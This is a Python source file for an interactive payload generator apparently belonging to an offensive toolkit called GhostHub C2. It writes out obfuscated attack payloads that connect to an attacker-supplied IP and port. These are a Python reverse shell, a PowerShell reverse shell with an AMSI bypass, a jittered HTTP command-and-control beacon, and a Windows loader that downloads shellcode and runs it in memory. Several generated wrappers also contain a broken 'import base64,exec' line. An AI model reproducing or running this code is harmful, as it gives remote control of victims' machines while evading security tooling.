import os
import random
import string
import base64
import questionary
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class PayloadForge:
    def __init__(self):
        self.output_dir = "payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def generate_random_name(self, extension):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{self.output_dir}/{name}.{extension}"

    def forge_python_revshell(self, lhost, lport):
        raw_code = f"""
import socket, os, pty, base64
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except Exception:
        pass
connect()
        """.strip()
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def forge_powershell_revshell(self, lhost, lport):
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        shell_logic = f"""
        $c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
            $sb = (iex $d 2>&1 | Out-String );
            $sendback = ([text.encoding]::ASCII).GetBytes($sb + "PS " + (pwd).Path + "> ");
            $s.Write($sendback,0,$sendback.Length);
            $s.Flush()
        }};
        $c.Close();
        """
        full_script = amsi_bypass + shell_logic.strip()
        encoded_command = base64.b64encode(
            full_script.encode('utf-16-le')).decode()
        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"

    def forge_http_beacon(self, lhost, lport):
        """Next-Gen C2: HTTP Beacon with Sleep/Jitter to evade network detection."""
        raw_code = f"""
import time, requests, subprocess, uuid, platform, random
def beacon():
    agent_id = str(uuid.uuid4())[:8]
    sysinfo = platform.system() + " " + platform.release()
    url_ping = "http://{lhost}:{lport}/api/v1/ping"
    url_res = "http://{lhost}:{lport}/api/v1/result"
    
    while True:
        try:
            r = requests.post(url_ping, json={{"id": agent_id, "sysinfo": sysinfo}}, timeout=5).json()
            if r.get("status") == "task":
                cmd = r.get("command")
                out = subprocess.getoutput(cmd)
                requests.post(url_res, json={{"id": agent_id, "result": out}}, timeout=5)
        except Exception:
            pass
        # Jitter: Sleep between 5 and 15 seconds to randomize traffic patterns
        time.sleep(random.randint(5, 15))
beacon()
"""
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def forge_memory_loader(self, lhost, lport):
        """Advanced Evasion: Direct Syscall / Memory Allocation Loader for Windows."""
        raw_code = f"""
import ctypes, urllib.request, base64
def inject():
    try:
        req = urllib.request.Request("http://{lhost}:{lport}/payload.bin", headers={{'User-Agent': 'Mozilla/5.0'}})
        shellcode = urllib.request.urlopen(req).read()
        
        # Bypass User-Land Hooks via direct memory allocation
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
        
        handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
    except Exception: pass
inject()
"""
        encoded_payload = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"

    def run(self):
        draw_header("Payload Forge: msfvenom-Elite")

        lhost = questionary.text("LHOST (Attacker IP):", style=Q_STYLE).ask()
        if not lhost:
            return

        lport = questionary.text(
            "LPORT (Default 4444):", default="4444", style=Q_STYLE).ask()

        target_type = questionary.select(
            "Target Environment & Tactics:",
            choices=[
                "Linux/Unix (Python TCP Reverse Shell)",
                "Windows (PowerShell + AMSI Bypass)",
                "macOS (Python Zlib-Compressed TCP Shell)",
                questionary.Separator("--- ADVANCED TACTICS ---"),
                "Cross-Platform (HTTP Beacon with Jitter)",
                "Windows (In-Memory Executable Loader)"
            ],
            style=Q_STYLE
        ).ask()

        if "Linux" in target_type:
            payload = self.forge_python_revshell(lhost, lport)
            fname = self.generate_random_name("py")
        elif "Windows (PowerShell" in target_type:
            payload = self.forge_powershell_revshell(lhost, lport)
            fname = self.generate_random_name("ps1")
        elif "macOS" in target_type:
            import zlib
            raw = self.forge_python_revshell(lhost, lport)
            compressed = base64.b64encode(zlib.compress(raw.encode())).decode()
            payload = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"
            fname = self.generate_random_name("py")
        elif "HTTP Beacon" in target_type:
            payload = self.forge_http_beacon(lhost, lport)
            fname = self.generate_random_name("py")
        elif "In-Memory" in target_type:
            payload = self.forge_memory_loader(lhost, lport)
            fname = self.generate_random_name("py")

        with open(fname, "w") as f:
            f.write(payload)

        console.print(Panel(
            f"[bold green][+] Payload Generated Successfully![/bold green]\n"
            f"[white]File Path:[/white] [cyan]{fname}[/cyan]\n\n"
            f"[dim]Note: Ensure GhostHub C2 is listening on {lhost}:{lport}[/dim]",
            title="Forge Result",
            border_style="green"
        ))
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def generate_shell():
    PayloadForge().run()
